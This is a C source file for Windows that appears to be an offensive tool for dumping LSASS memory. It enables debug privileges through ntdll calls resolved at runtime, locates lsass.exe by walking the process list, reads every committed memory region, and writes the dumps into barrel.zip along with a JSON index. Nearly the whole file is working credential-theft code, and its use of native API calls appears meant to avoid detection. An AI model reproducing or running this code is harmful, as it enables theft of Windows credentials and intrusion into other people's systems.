#include <stdio.h>
#include <windows.h>
#include "miniz.h"


// Constants
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
//#define TOKEN_QUERY 0x0008
//#define TOKEN_ADJUST_PRIVILEGES 0x0020
//#define MAX_MODULES 1024
//#define PAGE_NOACCESS 0x01
//#define MEM_COMMIT 0x00001000


// Structs
typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;


typedef struct {
    char filename[20];
    unsigned char* content;
    size_t size;
} MemFile;


// Enums
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
} PROCESSINFOCLASS;


// Functions
typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);


// Skeletons
char* GetProcNameFromHandle(HANDLE handle);
char* ReadRemoteWStr(HANDLE processHandle, PVOID address);
PVOID ReadRemoteIntPtr(HANDLE processHandle, PVOID address);


// Get SeDebugPrivilege privilege
void EnableDebugPrivileges() {
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE tokenHandle = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        exit(-1);
    }

    NtOpenProcessTokenFn NtOpenProcessToken = (NtOpenProcessTokenFn)GetProcAddress(hNtdll, "NtOpenProcessToken");
    NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)GetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");

    if (!NtOpenProcessToken || !NtAdjustPrivilegesToken || !NtClose) {
        printf("[-] Error getting function addresses.\n");
        exit(-1);
    }

    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        exit(-1);
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    printf("[+] Debug privileges enabled successfully.\n");
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    /////////////////////
    // NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Error getting NtQueryInformationProcess function address.\n");
        return NULL;
    }
    /////////////////////

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);

    /*
    // DEBUG
    printf("[+] pbi_addr: %p \n", pbi_addr);
    printf("[+] return length: %d \n", returnLength);
    printf("[+] peb pointer: %p\n", peb_pointer);
    printf("[+] peb address: %p\n", pebaddress);
    printf("[+] processparameters_pointer: %p\n", processparameters_pointer);
    printf("[+] processparameters_address: %p\n", processparameters_address);
    printf("[+] commandline_pointer: %p\n", commandline_pointer);
    printf("[+] commandline_address: %p\n", commandline_address);
    printf("[+] commandline_value: %s\n\n\n\n", commandline_value);
    */

    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    /////////////////////
    // NtGetNextProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtGetNextProcessFn NtGetNextProcess = (NtGetNextProcessFn)GetProcAddress(hNtdll, "NtGetNextProcess");
    if (!NtGetNextProcess) {
        printf("[-] Error getting NtGetNextProcess function address.\n");
        return NULL;
    }
    /////////////////////

    // Iterate processes
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        //printf("aux_handle: %d\n", aux_handle);
        //printf("[+] current_proc_name: %s\n ", current_proc_name);
        if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


// Function to generate a random string
void getRandomString(char* str, int length) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        str[i] = charset[key];
    }
    str[length] = '\0';
}


// Convert an array to JSON (simplified for string array)
void toJson(char* json, const char* filename, const char* address, const char* regionSize) {
    sprintf_s(json, sizeof(json), "{\"filename\":\"%s\", \"address\":\"%s\", \"regionSize\":\"%s\"}", filename, address, regionSize);
}


// Function to generate a zip file from the memfile_list
void GenerateZip(const char* zipFilePath, MemFile memfile_list[], int memfile_count) {
    // Delete the existing file if it exists
    remove(zipFilePath);

    // Create and open the ZIP archive
    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));  // Initialize the structure
    if (!mz_zip_writer_init_file(&zip_archive, zipFilePath, 0)) {
        printf("Error: Could not initialize ZIP archive '%s'.\n", zipFilePath);
        return;
    }

    // Add each MemFile to the ZIP archive
    for (int i = 0; i < memfile_count; i++) {
        MemFile* m = &memfile_list[i];
        // Add the file entry to the ZIP archive
        if (!mz_zip_writer_add_mem(&zip_archive, m->filename, m->content, m->size, MZ_BEST_SPEED)) {
            printf("Error: Could not add file '%s' to the ZIP archive.\n", m->filename);
            mz_zip_writer_end(&zip_archive);  // Close the archive in case of error
            return;
        }
    }

    // Finalize and close the ZIP archive
    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
        printf("Error: Could not finalize the ZIP archive.\n");
    }

    mz_zip_writer_end(&zip_archive);  // Always close the archive when done
    printf("[+] File %s generated.\n", zipFilePath);
}


int Barrel() {
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    printf("[+] Process handle:\t%d\n", hProcess);

    // Initialize variables
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";
    MemFile memfile_list[1024];     // Fixed array for simplicity
    int memfile_count = 0;          // Track number of MemFiles
    char json_output[256*256] = "[";  // Buffer for JSON array
    char json_item[256];           // Buffer for each JSON object


    // Loop through the memory regions
    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;

        // Populate MEMORY_BASIC_INFORMATION struct
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
        NTSTATUS ntstatus = NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (ntstatus != 0) {
            printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
        }

        // If readable and committed -> Write memory region to a file
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            /*
            // Allocate buffer for memory content
            unsigned char* buffer = (unsigned char*) malloc(mbi.RegionSize);
            if (!buffer) {
                printf("Memory allocation failed\n");
                return 1;
            }
            */

            // Generate random filename
            char memdump_filename[14];
            getRandomString(memdump_filename, 10);
            strcat_s(memdump_filename, ".");
            getRandomString(memdump_filename + 11, 3);
            // printf("memdump_filename: %s\n", memdump_filename);

            // ReadProcessMemory(GetCurrentProcess(), mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead); /// UPDATE!!!!
            HMODULE hNtDll = LoadLibraryA("ntdll.dll");
            if (hNtDll == NULL) {
                printf("Failed to load ntdll.dll\n");
                return 1;
            }

            // Get the address of NtReadVirtualMemory function.
            NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtDll, "NtReadVirtualMemory");
            // Buffer to store the read bytes
            SIZE_T regionSize = mbi.RegionSize;
            BYTE* buffer = (BYTE*)malloc(regionSize);
            if (buffer == NULL) {
                printf("Failed to allocate memory for buffer\n");
                return 1;
            }
            SIZE_T bytesRead = 0;     // Number of bytes actually read

            // Call NtReadVirtualMemory to read the memory from the remote process
            NTSTATUS status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, &bytesRead);

            if (status != 0 && status != 0x8000000D) { // 0x8000000D = Partial copy so its ok
                printf("NtReadVirtualMemory failed with status: 0x%X\n", status);
            }

            // Format each JSON item: {"string", "0xVALUE1", "VALUE2"}
            sprintf_s(json_item, "{\"field0\":\"%s\", \"field1\":\"0x%p\", \"field2\":\"%d\"}, ", memdump_filename, mem_address, mbi.RegionSize);
            // Append the JSON item to the final JSON array
            strcat_s(json_output, json_item);

            // Add to MemFile array
            MemFile memFile;
            strcpy_s(memFile.filename, memdump_filename);
            memFile.content = buffer;
            memFile.size = mbi.RegionSize;
            memfile_list[memfile_count++] = memFile;
        }
        // printf("[+]\t0x%p\n", mem_address);
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    // Close handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        exit(-1);
    }
    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
    NtClose(hProcess);

    // Close the JSON array
    size_t len = strlen(json_output);
    json_output[len - 2] = '\0';
    strcat_s(json_output, "]");

    // Print the resulting JSON array
    // printf("4");
    // printf("%s\n", json_output);

    // Write to file
    char filename[] = "barrel.json";
    FILE* file;
    errno_t err = fopen_s(&file, filename, "w");
    if (file == NULL) {
        printf("[-] Error opening file %s\n", filename);
        return 1;
    }
    fprintf(file, "%s", json_output);
    fclose(file);
    printf("[+] File %s generated.\n", filename);

    /*
    for (int i = 0; i < memfile_count; i++) {
        MemFile memFile = memfile_list[i];

        // Print filename
        printf("%d Filename: %s\tSize: %zu bytes", i, memFile.filename, memFile.size);
        // Print the first few bytes (let's print up to 10 bytes or less if content is smaller)
        printf("\tFirst bytes: ");
        for (size_t j = 0; j < memFile.size && j < 10; j++) {
            printf("%02X ", memFile.content[j]);
        }
        printf("\n");
    }
    */

    GenerateZip("barrel.zip", memfile_list, memfile_count);
}


int main() {
    Barrel();
    return 0;
}

